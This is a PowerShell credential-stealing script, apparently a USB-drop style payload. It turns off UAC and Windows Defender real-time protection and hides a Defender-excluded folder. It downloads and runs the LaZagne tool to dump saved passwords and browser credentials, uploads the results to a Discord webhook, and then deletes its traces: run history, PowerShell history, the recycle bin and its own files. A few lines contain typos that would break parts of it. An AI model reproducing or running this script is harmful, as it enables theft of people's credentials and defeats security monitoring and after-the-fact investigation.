# Disable lua
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0

# Disable real time protection
Set-MpPreference -DisableRealtimeMonitoring $true

$webhook = 'https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC'
# Create a tmp directory in the Downloads folder
$dir = "C:\Users\$env:UserName\Downloads\Temp"
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
New-Item -ItemType Directory -Path $dir
# Add an exception to Windows Defender for the tmp directory
Add-MpPreference -ExclusionPath $dir
# Hide the directory
$hide = Get-Item $dir -Forces
$hide.attributes='Hidden'
# Download the executable
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$dir\lazagne.exe"
# Execute the executable and save output to a file
& "$dir\lazagne.exe" all -vv > "$dir\$FileName"; .\"$dir\lazagne.exe" browsers -vv >> "$dir\$FileName";

#Stage 1 Obtain the credentials from the Chrome browsers User Data folder
echo $l >> $dir\$FileName

#Stage 2 Upload them to Discord
curl.exe -X POST -F 'payload_json={\"username\": \"binBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$dir\$FieName" $webhook


#Stage 3 Cleanup Traces

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 
rm $dir\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

# Remove the script from the system
Clear-History

